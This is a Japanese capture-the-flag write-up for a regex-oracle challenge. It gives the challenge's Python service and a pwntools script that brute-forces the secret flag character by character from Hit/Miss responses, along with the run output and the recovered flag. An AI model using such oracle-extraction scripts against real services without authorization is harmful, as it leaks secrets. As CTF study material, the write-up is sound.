# Writeup for hit-and-miss

次の Python スクリプトが与えられます:

```python
import os, re

FLAG = os.environ.get("FLAG", "Alpaca{REDACTED}")
assert re.fullmatch(r"Alpaca\{\w+\}", FLAG)

while pattern := input("regex> "):
    if re.match(pattern, FLAG):
        print("Hit!")
    else:
        print("Miss...")
```

環境変数にフラグがあり、プレイヤーの入力を正規表現のパターンとして、マッチするかどうかを判定してくれます。

例えば、

```
regex> Alpaca{.+}
Hit!
regex> Alpaca{HELLO}
Miss...
```

のような挙動になります。

一文字ずつ特定できそうなので、そのスクリプトを書いてみます:

```python
from pwn import remote
import os
import string

r = remote(os.getenv("HOST"), os.getenv("PORT"))

flag = b"Alpaca{"

for _ in range(100):
    for c in string.ascii_letters + string.digits + "_}":
        r.recvuntil(b"regex>")
        r.sendline(flag + c.encode() + b".*")
        if b"Hit" in r.recvline():
            flag += c.encode()
            print(flag)
            if c == "}":
                exit()
            break
```

これを実行すると、

```
$ HOST=34.170.146.252 PORT=46849 python solve.py
[+] Opening connection to 34.170.146.252 on port 46849: Done
b'Alpaca{'
b'Alpaca{R'
b'Alpaca{Re'
...
b'Alpaca{Reg3x_Crossw0rd'
b'Alpaca{Reg3x_Crossw0rd}'
[*] Closed connection to 34.170.146.252 port 46849
```

となり、フラグが求まりました。

Flag: `Alpaca{Reg3x_Crossw0rd}`

author が「[今日の問題を解けた人はフラグを検索すると、なんと延長戦ができます](https://x.com/arkark_/status/1998056992792105387)」と言っており、

「Regex Crossword」で検索すると、延長戦が出来ました。

![alt text](assets/image.png)
